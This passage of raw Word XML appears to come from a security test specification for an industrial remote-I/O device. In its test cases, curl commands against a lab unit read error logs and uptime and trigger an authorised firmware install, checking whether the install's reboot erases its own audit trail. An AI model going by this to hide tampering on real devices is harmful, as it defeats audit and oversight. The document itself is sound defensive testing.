        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SysCom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> interruption) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041CCB2C" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId198" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0801_log_after.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAB0045" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>diff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC0801_log_base.json TC0801_log_after.json | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>tee</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC0801_logdiff.txt # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>expect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">: new </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>ErrorEvent</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3E363421" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Log </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>readable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> (CR 6.1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>met</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">) ☐ Event </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>captured</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> ☐ No </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>identity</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>timestamp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>present</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC0801_*.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">, TC0801_logdiff.txt, IoT-Core </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>screenshots</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407AA064" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="406972B9">
          <v:rect id="_x0000_i1545" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B680454" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ008-02 — Self-Erasing Firmware Install (G-3 proof — decisive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="207AE8DA" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B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7752"/>
      </w:tblGrid>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="3BDE95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43C0F9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4ED8C4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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="31814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BD421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5DFA2" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>TC-RQ008-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="2EA93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98555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CE566" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>RQ-008 → CR 3.9 / CR 2.11 → Asset I, Asset D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="59FE6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A81BC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FCBE8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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Repudiation + anti-forensic Tampering</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (self-inflicted)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="2D7B0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78040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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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FE46D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SVV-2</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (Threat-Mitigation </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="014A3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3EB69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AF6C8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Demonstrate that a </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>legitimate</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> firmware install destroys its own evidence: the /firmware/install reboot (and mandatory Exit-Update power reset) triggers a cold start that </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>clears the Error Log and resets uptime</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>, so no retained, time-stamped record of the software intervention survives.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="1318C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AE043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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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A2922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1. Baseline the Error Log and uptime. 2. Perform an </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> firmware update (999 + reboot → upload → /firmware/install). 3. After the install reboot, re-read the Error Log and uptime. 4. Determine whether any persistent, time-stamped record of the install remains.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="5396D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9F49C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9E585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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected:</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> post-install log empty/cleared and uptime reset toward zero → the install has </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>erased its own evidence</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, confirming </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and a </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL against RQ-008</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>. A device retaining a persistent, time-stamped install record across the reboot would refute G-3 (investigate).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5DB11571" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0002207B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5670"/>
      </w:tblGrid>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="6D7B03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906C0F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8E7DC0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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="6DB111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D62CE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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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44D94" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>TC-RQ008-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="42E5E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F20F4B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17302" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">Spare DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="55A1C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ECFD4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79F94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>curl (log/uptime + update services); rotary switch</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3A5C7430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># TC-RQ008-02 Does a legitimate install retain evidence across its own reboot?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E234D3" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId199" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0802_log_pre.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C113EE6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 xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId200" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/systemtime/systick</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0802_tick_pre.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA6B288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 xml:space="preserve"># --- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> update: rotary=999 + reboot; upload a valid container; then: ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721BCEFD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 xml:space="preserve">curl -s -X POST </w:t>
      </w:r>
      <w:hyperlink r:id="rId201" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/firmware/install</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> # "initiates a reboot to install"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE0B9F8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># --- device reboots (cold start); after Exit-Update power reset and re-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4B34E3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 xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId202" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0802_log_post.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F38C17A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 xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId203" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/systemtime/systick</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0802_tick_post.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F635D6E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>diff TC0802_log_pre.json TC0802_log_post.json | tee TC0802_logdiff.txt # expect: log cleared</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52042565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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Post-install log empty (cleared on cold start, SRIO-6521); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tick_post</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;&lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tick_pre</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (uptime reset, SRIO-15398); no persistent install record. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Evidence self-erased (G-3 confirmed) ☐ Record retained (investigate) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC0802_log_pre/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>post.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, TC0802_tick_pre/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>post.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, TC0802_logdiff.txt, /firmware/version before/after | </w:t>
      </w:r>
      <w:hyperlink r:id="rId204" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="041B64D8" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="2862EA2A">
          <v:rect id="_x0000_i1546" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F85B15" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ008-03 — Legitimate vs Illegitimate: Evidence Cannot Classify (G-2 proof — evidence-scoped)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CAF957" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B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762"/>
      </w:tblGrid>
